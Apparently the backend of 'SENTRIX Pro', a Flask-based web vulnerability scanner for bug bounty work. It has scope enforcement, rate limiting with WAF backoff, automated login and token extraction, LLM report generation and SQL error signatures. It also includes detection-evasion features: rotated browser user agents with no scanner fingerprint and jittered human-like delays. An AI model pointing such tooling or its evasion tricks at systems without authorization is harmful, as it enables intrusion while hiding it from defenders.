"""
SENTRIX Pro Edition - Professional Vulnerability Scanner
=========================================================
Real-world grade scanner built for bug bounty programs.
For authorized testing and bug bounty programs only.

UPGRADE v7.0 — Real Target Hardening
  - Hard scope enforcement: every request blocked if outside target domain
  - Scope check in safe_get/safe_post/safe_request — cannot be bypassed
  - LFI: 51→20 payloads, API-only skip, 5000-combo safety cap
  - WAF FP fix: single 403 no longer triggers blocked state
  - Parallelism guard: /scan returns 409 if scan already running
  - CmdI time-based: 5-request confirmation protocol (3 baseline + 2 payload)
  - SQLi time-based: skips MySQL/MSSQL payloads on SQLite/Node.js targets

UPGRADE v6.0 — Authenticated Scanning + Bug Bounty Safety
  - Authenticated scanning: JSON API + HTML form login + manual token
  - Smart token extraction: JWT body, nested JSON, Set-Cookie
  - Auth re-crawl: discovers endpoints only visible when logged in
  - Bug Bounty mode: 2 req/sec default, human-like delays, safe headers
  - Scope protection: never scans outside specified domain
  - Responsible disclosure headers on every request

UPGRADE v5.1 — Round 4: False Positive Elimination
  - SPA catch-all detection: Angular/React/Vue 404→index.html no longer triggers sensitive file findings
  - Content verification: sensitive files must contain expected content signatures to be flagged
  - Admin panel FP fix: SPA routing no longer fakes /admin /wp-admin /phpmyadmin
  - Crawl URL sanitization: malformed/quoted JS-extracted URLs no longer tested as real endpoints
  - JWT: now POSTs to login endpoints to collect tokens (catches Juice Shop, Node APIs)

UPGRADE v5.0 — Round 3: JWT, GraphQL, Subdomain Takeover, XXE, CORS
  - JWT Testing: none/alg-confusion/weak-secret attacks
  - GraphQL: introspection detection + injection testing
  - Subdomain Takeover: CNAME dangling + known fingerprints
  - XXE Injection: classic + blind + OOB + parameter entity
  - CORS: origin reflection, null origin, subdomain bypass

UPGRADE v4.0 — Round 2: Production WAF Bypass + API Testing
  - Context-Aware XSS: detects HTML/attr/JS/URL context → right payload
  - WAF Bypass payloads: encoding, chunking, case, comments, unicode
  - JSON/API body testing: POST /api endpoints with JSON payloads
  - Hidden parameter discovery: debug, admin, test, source params
  - Header injection: Host, X-Forwarded-For, X-Original-URL, Referer
  - API endpoint bruteforce from common paths + JS extraction
  - Param mining via wordlist on every discovered endpoint

v3.1 — Round 1: False positive elimination
  - SSTI: double canary math verification
  - SSRF: redirect param exclusion + reflection detection
  - CmdI: smart param targeting, 2-phase

v3.0 — Priority 1+2 overhaul
  - TRUE global rate limiter (token bucket)
  - SQLi: Error + Boolean-Blind + Time-Based + Union
  - SSTI, CmdI, Stored XSS, JS extraction, Tech fingerprint

Run: python backend.py
Requires: pip install flask flask-cors requests beautifulsoup4 python-dotenv
"""

from flask import Flask, jsonify, request
from flask_cors import CORS
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse
import threading
import time
import re
import os
import json
import base64
import random
import string
from dotenv import load_dotenv
import concurrent.futures

load_dotenv()
GROQ_API_KEY = os.getenv("GROQ_API_KEY", "")

app = Flask(__name__, static_folder=".", static_url_path="")
CORS(app)


@app.route("/")
def serve_index():
    return app.send_static_file("index.html")

# ─────────────────────────────────────────────────
# SCAN STATE
# ─────────────────────────────────────────────────
scan_state = {
    "running": False, "progress": 0, "step": "",
    "logs": [], "findings": [], "done": False, "error": None,
    "mode": "active", "total_requests": 0, "req_per_sec": 0,
    "blocked": False, "scope_violations": 0,
    "waf_blocks": 0, "waf_paused": False, "waf_hard_stopped": False
}

_lock = threading.Lock()
THREADS = 15


# ═══════════════════════════════════════════════════════════════
# TRUE GLOBAL RATE LIMITER — Token Bucket
# Guarantees X req/sec across ALL threads combined — not per thread
# This is what bug bounty programs actually measure
# ═══════════════════════════════════════════════════════════════
class WAFHardStopException(Exception):
    pass


class RateLimiter:
    """
    True token bucket rate limiter.
    ALL threads share one token pool.
    If rate=10, the entire scanner makes ≤10 req/sec total.
    Includes WAF backoff: exponential delay + pause + hard stop.
    Rate recovery: +25% of gap per successful request.
    """
    def __init__(self, max_per_second=5):
        self.max_rps        = max_per_second
        self.original_rps   = max_per_second
        self.lock           = threading.Lock()
        # Token bucket state
        self.tokens         = max_per_second
        self.last_refill    = time.time()
        # WAF state
        self.consecutive_blocks = 0
        self.total_blocks       = 0
        self.backoff_level      = 0
        self.hard_stopped       = False
        self.paused_until       = 0
        self.MAX_CONSECUTIVE    = 5
        self.HARD_STOP_TOTAL    = 20
        self.PAUSE_DURATION     = 45

    def _refill(self):
        """Refill tokens based on elapsed time"""
        now = time.time()
        elapsed = now - self.last_refill
        new_tokens = elapsed * self.max_rps
        self.tokens = min(self.max_rps, self.tokens + new_tokens)
        self.last_refill = now

    def wait(self):
        """Block until a token is available. Guarantees global rate."""
        if self.hard_stopped:
            raise WAFHardStopException("WAF hard stop — reduce rate and retry.")

        while True:
            with self.lock:
                # Check pause
                now = time.time()
                if now < self.paused_until:
                    wait_time = self.paused_until - now
                else:
                    self._refill()
                    if self.tokens >= 1:
                        self.tokens -= 1
                        scan_state["total_requests"] = scan_state.get("total_requests", 0) + 1
                        # Update live req/sec display
                        scan_state["req_per_sec"] = min(self.max_rps,
                            int(self.max_rps - self.tokens + 1))
                        return
                    # How long until next token available
                    wait_time = (1 - self.tokens) / max(self.max_rps, 0.001)

            time.sleep(min(wait_time, 0.05))

    def on_success(self):
        with self.lock:
            self.consecutive_blocks = 0
            if self.backoff_level > 0 and self.max_rps < self.original_rps:
                gap = self.original_rps - self.max_rps
                self.max_rps = min(self.original_rps,
                    self.max_rps + max(1, gap // 4))
                if self.max_rps >= self.original_rps:
                    self.backoff_level = 0
                    self.max_rps = self.original_rps

    def on_block(self, status_code):
        backoff_sleep = 0
        do_pause = False
        with self.lock:
            self.consecutive_blocks += 1
            self.total_blocks       += 1
            scan_state["waf_blocks"]  = self.total_blocks
            # Only flag as WAF-blocked on 429 (explicit rate limit) OR
            # after 3+ consecutive 403s. A single 403 is normal auth behavior.
            if status_code == 429 or self.consecutive_blocks >= 3:
                scan_state["blocked"] = True
            self.backoff_level = min(5, self.backoff_level + 1)
            # 403 gets gentler backoff than 429 — it might just be auth
            backoff_sleep = (2 ** self.backoff_level) if status_code == 429 else 0
            new_rate = max(1, self.original_rps // (2 ** self.backoff_level)) if status_code == 429 else self.max_rps
            self.max_rps = new_rate
            self.tokens  = 0
            if status_code == 429:
                log(f"Rate limited (HTTP 429) — backoff {backoff_sleep}s — rate -> {new_rate} req/sec", "warn")
            if self.consecutive_blocks >= self.MAX_CONSECUTIVE:
                self.paused_until = time.time() + self.PAUSE_DURATION
                self.consecutive_blocks = 0
                do_pause = True
                log(f"WAF THRESHOLD — Pausing {self.PAUSE_DURATION}s. Blocks so far: {self.total_blocks}", "danger")
                scan_state["waf_paused"] = True
            if self.total_blocks >= self.HARD_STOP_TOTAL:
                self.hard_stopped = True
                log("WAF HARD STOP — Scan aborted. Lower rate and retry.", "danger")
                scan_state["waf_hard_stopped"] = True
                return
        time.sleep(backoff_sleep)
        if do_pause:
            scan_state["waf_paused"] = False

    def set_rate(self, rps):
        with self.lock:
            self.max_rps      = max(1, rps)
            self.original_rps = max(1, rps)
            self.tokens       = max(1, rps)
            self.last_refill  = time.time()
        log(f"Rate limit set to {rps} req/sec", "info")

    def reset_waf_state(self):
        with self.lock:
            self.consecutive_blocks = 0
            self.total_blocks       = 0
            self.backoff_level      = 0
            self.hard_stopped       = False
            self.paused_until       = 0
            self.tokens             = self.max_rps
            self.last_refill        = time.time()


rate_limiter = RateLimiter(max_per_second=5)


# ─────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────
def reset_state(mode="active", target=""):
    global _session_ua
    _session_ua = None  # Fresh browser UA per scan — each scan looks like a new user
    scan_state.update({
        "running": True, "progress": 0, "step": "Starting...",
        "logs": [], "findings": [], "done": False, "error": None,
        "mode": mode, "total_requests": 0, "req_per_sec": 0,
        "blocked": False, "scope_violations": 0,
        "waf_blocks": 0, "waf_paused": False, "waf_hard_stopped": False,
        "authenticated": False, "auth_user": None,
        "_scan_target": target,  # Hard scope boundary for all requests
    })
    rate_limiter.reset_waf_state()

def log(msg, level="info"):
    with _lock:
        scan_state["logs"].append({"msg": msg, "level": level,
            "time": time.strftime("%H:%M:%S")})
    print(f"[{level.upper()}] {msg}")

def add_finding(name, severity, endpoint, description, payload, remediation, curl=None):
    """
    Add a finding to scan results.
    
    curl: optional ready-to-run curl command for manual verification.
          If not provided, one is auto-generated from the payload line.
    """
    with _lock:
        for f in scan_state["findings"]:
            if f["name"] == name and f["endpoint"] == endpoint:
                return
        scan_state["findings"].append({
            "name": name, "severity": severity, "endpoint": endpoint,
            "description": description, "payload": payload,
            "remediation": remediation,
            "curl": curl or "",
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        })
    log(f"FOUND: [{severity.upper()}] {name} at {endpoint}", "danger")

def dedup_params(params_map):
    """One URL per unique path+param combo — prevents testing cat=1,cat=2,cat=3 separately"""
    seen = set()
    out  = {}
    for url, param_names in params_map.items():
        key = urlparse(url).path + "|" + ",".join(sorted(param_names))
        if key not in seen:
            seen.add(key)
            out[url] = param_names
    return out

def dedup_forms(forms):
    """One form per unique action+input combo"""
    seen = set()
    out  = []
    for f in forms:
        key = f["action"] + "|" + ",".join(sorted(i["name"] for i in f["inputs"] if i["name"]))
        if key not in seen:
            seen.add(key)
            out.append(f)
    return out

def safe_get(url, **kwargs):
    """Rate-limited GET — hard scope check + token bucket rate compliance"""
    # ── HARD SCOPE ENFORCEMENT ─────────────────────────────────
    # Every request must stay within the target domain.
    # This is non-negotiable for bug bounty — out-of-scope = ban.
    _target = scan_state.get("_scan_target", "")
    if _target:
        _parsed_url    = urlparse(url)
        _parsed_target = urlparse(_target)
        _target_host   = _parsed_target.netloc.lower()
        _req_host      = _parsed_url.netloc.lower()
        # Allow exact match or subdomain of target
        if _req_host and _req_host != _target_host and not _req_host.endswith("." + _target_host):
            with _lock:
                scan_state["scope_violations"] = scan_state.get("scope_violations", 0) + 1
            raise ValueError(f"SCOPE BLOCK: {url} is outside target {_target_host}")
    rate_limiter.wait()
    try:
        resp = requests.get(url, **kwargs)
        if resp.status_code == 429:
            # 429 = explicit rate limit — always trigger WAF backoff
            rate_limiter.on_block(resp.status_code)
            rate_limiter.wait()
            kwargs["headers"] = get_headers()
            resp = requests.get(url, **kwargs)
        elif resp.status_code == 403:
            # 403 = could be WAF OR normal access control.
            # Only treat as WAF block after 3+ consecutive 403s — 
            # a single 403 on an API endpoint is normal authorization behavior.
            rate_limiter.on_block(resp.status_code)
        elif resp.status_code == 503:
            log("Server overloaded (503) — pausing 5s", "warn")
            time.sleep(5)
        else:
            rate_limiter.on_success()
        return resp
    except WAFHardStopException:
        raise
    except requests.exceptions.ConnectionError:
        scan_state["blocked"] = True
        raise
    except Exception:
        raise

def safe_post(url, **kwargs):
    """Rate-limited POST — hard scope check + token bucket rate compliance"""
    _target = scan_state.get("_scan_target", "")
    if _target:
        _parsed_url    = urlparse(url)
        _parsed_target = urlparse(_target)
        _target_host   = _parsed_target.netloc.lower()
        _req_host      = _parsed_url.netloc.lower()
        if _req_host and _req_host != _target_host and not _req_host.endswith("." + _target_host):
            with _lock:
                scan_state["scope_violations"] = scan_state.get("scope_violations", 0) + 1
            raise ValueError(f"SCOPE BLOCK: {url} is outside target {_target_host}")
    rate_limiter.wait()
    try:
        resp = requests.post(url, **kwargs)
        if resp.status_code in (429, 403):
            rate_limiter.on_block(resp.status_code)
            rate_limiter.wait()
            kwargs["headers"] = get_headers()
            resp = requests.post(url, **kwargs)
        elif resp.status_code == 503:
            log("Server overloaded (503) — pausing 5s", "warn")
            time.sleep(5)
        else:
            rate_limiter.on_success()
        return resp
    except WAFHardStopException:
        raise
    except requests.exceptions.ConnectionError:
        scan_state["blocked"] = True
        raise
    except Exception:
        raise

def safe_request(method, url, **kwargs):
    """Rate-limited generic request (PUT/PATCH/DELETE) — hard scope check"""
    _target = scan_state.get("_scan_target", "")
    if _target:
        _parsed_url    = urlparse(url)
        _parsed_target = urlparse(_target)
        _target_host   = _parsed_target.netloc.lower()
        _req_host      = _parsed_url.netloc.lower()
        if _req_host and _req_host != _target_host and not _req_host.endswith("." + _target_host):
            with _lock:
                scan_state["scope_violations"] = scan_state.get("scope_violations", 0) + 1
            raise ValueError(f"SCOPE BLOCK: {url} is outside target {_target_host}")
    rate_limiter.wait()
    try:
        resp = requests.request(method, url, **kwargs)
        if resp.status_code in (429, 403):
            rate_limiter.on_block(resp.status_code)
            rate_limiter.wait()
            if "headers" in kwargs:
                kwargs["headers"] = {**kwargs["headers"], **get_headers()}
            resp = requests.request(method, url, **kwargs)
        elif resp.status_code == 503:
            log("Server overloaded (503) — pausing 5s", "warn")
            time.sleep(5)
        else:
            rate_limiter.on_success()
        return resp
    except WAFHardStopException:
        raise
    except requests.exceptions.ConnectionError:
        scan_state["blocked"] = True
        raise
    except Exception:
        raise

def in_scope(url, scope):
    if not scope:
        return True
    parsed    = urlparse(url)
    scope_url = urlparse(scope if scope.startswith("http") else "http://" + scope)
    return (parsed.netloc == scope_url.netloc or
            parsed.netloc.endswith("." + scope_url.netloc))

# Real browser User-Agents — recent, diverse, nothing that screams "scanner"
_USER_AGENTS = [
    # Chrome Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    # Chrome Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    # Firefox Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    # Firefox Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:123.0) Gecko/20100101 Firefox/123.0",
    # Safari Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    # Chrome Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    # Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
]

# Sticky UA per scan session — same browser throughout looks more natural
_session_ua = None
_ua_suffix = ""  # Program-specific suffix e.g. " ywh-bb-sncf-connect"

def get_headers():
    global _session_ua, _ua_suffix
    if _session_ua is None:
        _session_ua = random.choice(_USER_AGENTS)
    return {
        "User-Agent": _session_ua + (_ua_suffix if _ua_suffix else ""),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        # NOTE: No Upgrade-Insecure-Requests header — it causes servers to 301 redirect
        # to HTTPS, which breaks crawling on HTTP targets (localhost, staging, etc.)
        # NOTE: No scanner fingerprint header — stealth by default.
    }


def human_delay(base=0.5, variance=0.3):
    """Jittered delay between requests in bounty mode.
    
    Uniform req/sec is detectable even at low rates — security tools
    look for perfectly spaced requests. ±40% jitter makes it look like
    actual browser activity (page load, DOM parse, user think time).
    """
    if scan_state.get("bounty_mode"):
        # Occasionally add a longer "think time" pause (simulates user reading)
        if random.random() < 0.08:  # 8% chance of 2-5s pause
            time.sleep(random.uniform(2.0, 5.0))
        else:
            # Normal jitter: base ± 40%
            jitter = base * random.uniform(0.6, 1.4)
            time.sleep(jitter)

def _safe_module(fn, *args, **kwargs):
    """Wrap every module — WAFHardStop propagates, all other errors skipped"""
    try:
        fn(*args, **kwargs)
    except WAFHardStopException:
        raise
    except requests.exceptions.ConnectionError as e:
        log(f"Connection lost in {fn.__name__} — skipping ({e})", "warn")
    except Exception as e:
        log(f"Module {fn.__name__} error — skipping ({e})", "warn")


# ═══════════════════════════════════════════════════════════════
# AUTHENTICATED LOGIN HANDLER
#
# Supports three login styles automatically:
#   1. JSON API  → POST {"email":"x","password":"y"} → JWT in response body
#   2. HTML Form → POST username=x&password=y → session cookie
#   3. Direct    → user pastes token directly, no login needed
#
# After login, injects auth into ALL subsequent requests:
#   → Authorization: Bearer <token>  (JWT / API token)
#   → Cookie: <name>=<value>         (session cookie)
# ═══════════════════════════════════════════════════════════════
def perform_login(login_url, username, password, base_url):
    """
    Attempt login and return an auth_headers dict to inject into all requests.
    Returns {} if login fails.
    """
    session = requests.Session()
    session.verify = False

    log(f"AUTH: Attempting login at {login_url}...", "info")

    # ── Strategy 1: JSON API login (modern apps — Juice Shop, Node APIs) ──
    # Try common JSON field name combinations
    json_payloads = [
        {"email": username, "password": password},
        {"username": username, "password": password},
        {"user": username, "password": password},
        {"login": username, "password": password},
        {"email": username, "pass": password},
        {"username": username, "pass": password},
    ]

    for payload in json_payloads:
        try:
            # Build clean login headers — no extra headers that could cause 500s
            # Some apps (e.g. Juice Shop) crash on unexpected headers like X-Bug-Bounty
            base_origin = login_url.split("/api/")[0] if "/api/" in login_url else login_url.rsplit("/",1)[0]
            login_headers = {
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Origin": base_origin,
                "Referer": base_origin + "/",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
            }
            resp = session.post(
                login_url,
                json=payload,
                headers=login_headers,
                timeout=10,
                allow_redirects=True,
                verify=False
            )

            log(f"AUTH: POST {login_url} → HTTP {resp.status_code} ({list(payload.keys())[0]}=...)", "muted")

            # Log error body so we can diagnose issues
            if resp.status_code >= 400:
                err_preview = resp.text[:200].replace('\n', ' ').replace('\r', '')
                log(f"AUTH: Error response: {err_preview}", "muted")

            if resp.status_code in (200, 201):
                body = resp.text
                log(f"AUTH: Response preview: {body[:120]}", "muted")

                # ── Priority 1: JWT regex anywhere in body (catches all formats) ──
                jwt_match = re.search(r'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}', body)
                if jwt_match:
                    token = jwt_match.group(0)
                    log(f"AUTH: ✓ JWT token extracted from response body", "success")
                    log(f"AUTH: Token preview: {token[:50]}...", "muted")
                    scan_state["auth_token_raw"] = token
                    return {
                        "Authorization": f"Bearer {token}",
                        "auth_type": "jwt",
                        "auth_token": token
                    }

                # ── Priority 2: Parse JSON and search all fields recursively ──
                try:
                    data = resp.json()
                    log(f"AUTH: JSON keys: {list(data.keys()) if isinstance(data, dict) else type(data)}", "muted")

                    def find_token_in_obj(obj, depth=0):
                        """Recursively search JSON for JWT tokens or token fields"""
                        if depth > 5:
                            return None
                        if isinstance(obj, str):
                            # Check if the string itself looks like a JWT
                            if re.match(r'^eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}$', obj):
                                return obj
                            return None
                        if isinstance(obj, dict):
                            # Check known token field names first
                            token_fields = ["token", "access_token", "accessToken", "jwt",
                                           "id_token", "idToken", "auth_token", "authToken",
                                           "sessionToken", "session_token", "bearerToken",
                                           "bearer_token", "authorizationToken"]
                            for field in token_fields:
                                if field in obj and isinstance(obj[field], str) and len(obj[field]) > 20:
                                    return obj[field]
                            # Recurse into all values
                            for v in obj.values():
                                result = find_token_in_obj(v, depth + 1)
                                if result:
                                    return result
                        if isinstance(obj, list):
                            for item in obj:
                                result = find_token_in_obj(item, depth + 1)
                                if result:
                                    return result
                        return None

                    token = find_token_in_obj(data)
                    if token:
                        log(f"AUTH: ✓ Token found via recursive JSON search", "success")
                        log(f"AUTH: Token preview: {token[:50]}...", "muted")
                        scan_state["auth_token_raw"] = token
                        return {
                            "Authorization": f"Bearer {token}",
                            "auth_type": "jwt",
                            "auth_token": token
                        }

                except Exception as parse_err:
                    log(f"AUTH: JSON parse error: {parse_err}", "muted")

                # ── Priority 3: Session cookie ──
                cookies = resp.cookies
                if cookies:
                    cookie_header = "; ".join([f"{c.name}={c.value}" for c in cookies])
                    auth_cookie_names = ["session", "token", "auth", "jwt", "access",
                                         "sid", "sessionid", "PHPSESSID", "ASP.NET_SessionId",
                                         "connect.sid", "remember_token"]
                    for cookie in cookies:
                        if any(name.lower() in cookie.name.lower() for name in auth_cookie_names):
                            log(f"AUTH: ✓ Session cookie obtained: {cookie.name}", "success")
                            return {
                                "Cookie": cookie_header,
                                "auth_type": "cookie",
                                "auth_token": cookie_header
                            }

                log(f"AUTH: HTTP 200 but no token found in response", "warn")

            elif resp.status_code == 401:
                log(f"AUTH: 401 — wrong credentials or wrong field names for this payload", "warn")
                # Don't break — next payload might use different field names
            elif resp.status_code == 403:
                log(f"AUTH: 403 — access forbidden", "warn")
                break
            elif resp.status_code == 500:
                # 500 on login usually means wrong field names caused a server error
                # Try next payload combination
                log(f"AUTH: 500 — server error (likely wrong field names), trying next combo...", "muted")
            else:
                log(f"AUTH: Unexpected status {resp.status_code}", "muted")

        except Exception as e:
            log(f"AUTH: Request error: {e}", "warn")
            continue

    # ── Strategy 2: HTML Form login (traditional PHP/ASP apps) ────────────
    try:
        # First GET the login page to find the form and any CSRF tokens
        login_page = session.get(login_url, timeout=10, verify=False,
                                  headers={"User-Agent": "Mozilla/5.0 Chrome/120.0.0.0"})

        # Extract CSRF token if present
        csrf_patterns = [
            r'name=["\']csrf[_-]?token["\'][^>]*value=["\']([^"\']+)["\']',
            r'name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']',
            r'name=["\']authenticity_token["\'][^>]*value=["\']([^"\']+)["\']',
            r'name=["\']__RequestVerificationToken["\'][^>]*value=["\']([^"\']+)["\']',
            r'value=["\']([^"\']+)["\'][^>]*name=["\']csrf[_-]?token["\']',
        ]
        csrf_token = None
        for pattern in csrf_patterns:
            match = re.search(pattern, login_page.text, re.IGNORECASE)
            if match:
                csrf_token = match.group(1)
                log(f"AUTH: CSRF token found: {csrf_token[:20]}...", "muted")
                break

        # Build form payload — try common field names
        form_payloads = [
            {"username": username, "password": password},
            {"email": username, "password": password},
            {"user": username, "password": password},
            {"login": username, "password": password},
            {"uname": username, "pass": password},
            {"tfUName": username, "tfUPass": password},  # vulnweb specific
        ]

        for form_data in form_payloads:
            if csrf_token:
                form_data["csrf_token"] = csrf_token
                form_data["_token"] = csrf_token
                form_data["authenticity_token"] = csrf_token

            try:
                resp = session.post(
                    login_url,
                    data=form_data,
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Referer": login_url,
                        "User-Agent": "Mozilla/5.0 Chrome/120.0.0.0"
                    },
                    timeout=10,
                    allow_redirects=True,
                    verify=False
                )

                # Success: redirected away from login page, or got auth cookie
                login_path = urlparse(login_url).path.lower()
                current_path = urlparse(resp.url).path.lower()
                redirected_away = (current_path != login_path)

                # Check for failure keywords in response
                failure_keywords = ["invalid", "incorrect", "wrong", "failed",
                                    "error", "invalid credentials", "login failed",
                                    "bad credentials", "unauthorized"]
                has_failure = any(kw in resp.text.lower() for kw in failure_keywords)

                # Success keywords
                success_keywords = ["logout", "sign out", "dashboard", "welcome",
                                    "profile", "account", "my account", "logged in"]
                has_success = any(kw in resp.text.lower() for kw in success_keywords)

                cookies = session.cookies
                has_auth_cookie = any(
                    any(name.lower() in c.name.lower()
                        for name in ["session", "auth", "token", "sid", "logged"])
                    for c in cookies
                )

                if (redirected_away or has_success or has_auth_cookie) and not has_failure:
                    if cookies:
                        cookie_header = "; ".join([f"{c.name}={c.value}" for c in cookies])
                        log(f"AUTH: ✓ Form login successful — session cookie obtained", "success")
                        log(f"AUTH: Cookies: {cookie_header[:60]}...", "muted")
                        return {
                            "Cookie": cookie_header,
                            "auth_type": "cookie",
                            "auth_token": cookie_header
                        }

            except Exception:
                continue

    except Exception as e:
        log(f"AUTH: Form login attempt failed: {e}", "warn")

    log(f"AUTH: ✗ Login failed — all strategies exhausted", "warn")
    log(f"AUTH: Continuing scan without authentication", "warn")
    return {}


def apply_auth(headers, auth_headers):
    """
    Merge auth headers into request headers.
    Handles both JWT Bearer tokens and session cookies.
    """
    if not auth_headers:
        return headers

    merged = headers.copy()

    if "Authorization" in auth_headers:
        merged["Authorization"] = auth_headers["Authorization"]

    if "Cookie" in auth_headers:
        # Merge with existing cookies if any
        existing = merged.get("Cookie", "")
        new_cookie = auth_headers["Cookie"]
        merged["Cookie"] = (existing + "; " + new_cookie).strip("; ") if existing else new_cookie

    # Always send JSON accept for API requests when authenticated
    if auth_headers.get("auth_type") == "jwt":
        merged["Accept"] = "application/json, text/html, */*"

    return merged


# ─────────────────────────────────────────────────
# ROUTES
# ─────────────────────────────────────────────────
@app.route("/ping", methods=["GET"])
def ping():
    return jsonify({"status": "ok", "message": "SENTRIX Pro v3.0 running"})

@app.route("/scan", methods=["POST"])
def start_scan():
    global _session_ua, _ua_suffix
    data       = request.json
    target     = data.get("target", "").strip()
    mode       = data.get("mode", "active")
    rps        = int(data.get("rate_limit", 10))
    scope      = data.get("scope", "")
    login_url  = data.get("login_url", "").strip()
    username   = data.get("username", "").strip()
    password   = data.get("password", "").strip()
    auth_token = data.get("auth_token", "").strip()
    ua_suffix  = data.get("ua_suffix", "").strip()

    # Reset UA each scan, apply new suffix
    _session_ua = None
    _ua_suffix = (" " + ua_suffix) if ua_suffix else ""

    if not target:
        return jsonify({"error": "No target"}), 400
    if scan_state.get("running"):
        return jsonify({"error": "Scan already running — stop or wait for completion", "status": "running"}), 409

    if not target.startswith("http"):
        target = "http://" + target
    rps = max(1, min(rps, 150))
    rate_limiter.set_rate(rps)

    bounty_mode = data.get("bounty_mode", False)

    auth_config = {
        "login_url":  login_url,
        "username":   username,
        "password":   password,
        "auth_token": auth_token,
    }

    scan_state["bounty_mode"] = bounty_mode
    if bounty_mode:
        rate_limiter.set_rate(min(rps, 2))

    threading.Thread(
        target=run_scan,
        args=(target, mode, scope, auth_config),
        daemon=True
    ).start()
    return jsonify({"status": "started", "target": target, "mode": mode, "rate_limit": rps})

@app.route("/set_rate", methods=["POST"])
def set_rate():
    rps = int(request.json.get("rps", 10))
    rps = max(1, min(rps, 150))
    rate_limiter.set_rate(rps)
    return jsonify({"rate_limit": rps})

@app.route("/status", methods=["GET"])
def get_status():
    return jsonify(scan_state)

@app.route("/report", methods=["POST"])
def generate_report():
    if not GROQ_API_KEY:
        return jsonify({"error": "No GROQ_API_KEY in .env file"}), 500
    data     = request.json
    target   = data.get("target", "unknown")
    findings = data.get("findings", [])
    if not findings:
        return jsonify({"error": "No findings"}), 400

    summary = "\n\n".join([
        f"{i+1}. [{f['severity'].upper()}] {f['name']}\n   Endpoint: {f['endpoint']}\n   Evidence: {f['payload']}"
        for i, f in enumerate(findings)
    ])

    prompt = f"""You are a senior penetration tester writing a professional bug bounty report.

Target: {target}
Date: {time.strftime("%Y-%m-%d")}
Total findings: {len(findings)}

Vulnerabilities:
{summary}

Write a professional pentest report with:

## EXECUTIVE SUMMARY
2-3 sentences for management.

## OVERALL RISK RATING
Critical/High/Medium/Low with justification.

## KEY FINDINGS
Top 3 most critical issues with business impact.

## REALISTIC ATTACK SCENARIO
Step-by-step exploitation chain combining multiple findings.

## PRIORITY REMEDIATIONS
Top 3 fixes ordered by impact. Be specific and actionable.

Be direct and professional."""

    try:
        resp = requests.post(
            "https://api.groq.com/openai/v1/chat/completions",
            headers={"Content-Type": "application/json",
                     "Authorization": f"Bearer {GROQ_API_KEY}"},
            json={"model": "llama-3.3-70b-versatile", "max_tokens": 1500,
                  "messages": [{"role": "user", "content": prompt}]},
            timeout=30
        )
        result = resp.json()
        if "error" in result:
            return jsonify({"error": result["error"]["message"]}), 500
        return jsonify({"report": result["choices"][0]["message"]["content"]})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ═══════════════════════════════════════════════════════════════
# PAYLOAD LIBRARIES
# ═══════════════════════════════════════════════════════════════

# ── SQLi Error-Based signatures (all major DB engines) ──────────
SQL_ERRORS = [
    # MySQL
    "you have an error in your sql syntax", "warning: mysql",
    "mysql_fetch_array()", "mysql_num_rows()", "mysql_fetch_assoc()",
    "supplied argument is not a valid mysql", "valid mysql result",
    "mysql server version", "com.mysql.jdbc",
    # MSSQL
    "microsoft ole db provider for sql server",
    "odbc sql server driver", "odbc microsoft access",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "incorrect syntax near", "syntax error converting",
    "conversion failed when converting",
    "microsoft jet database engine",
    "mssql_query()", "[microsoft][odbc", "[sql server]",
    "sqlsrv_query()", "sql server native client",
    # Oracle
    "ora-00907", "ora-00933", "ora-00936", "ora-01756",
    "oracle error", "oracle driver", "warning: oci_",
    # PostgreSQL
    "postgresql error", "pg_query(): query failed",
    "warning: pg_", "pgsql error", "org.postgresql.util",
    # SQLite
    "sqlite_query()", "sqlite3.operationalerror", "sqlite error",
    "sqlite_error", "near \"", "unrecognized token",
    # Sequelize ORM (Node.js) — leaks raw SQL query on error
    "sequelizedatabaseerror", "sequelize",
    "select * from", "where ((", "like '%", "deleteat is null",
    # Generic
    "sql syntax", "sql error", "syntax error",
    "unexpected end of sql command", "division by zero in sql",
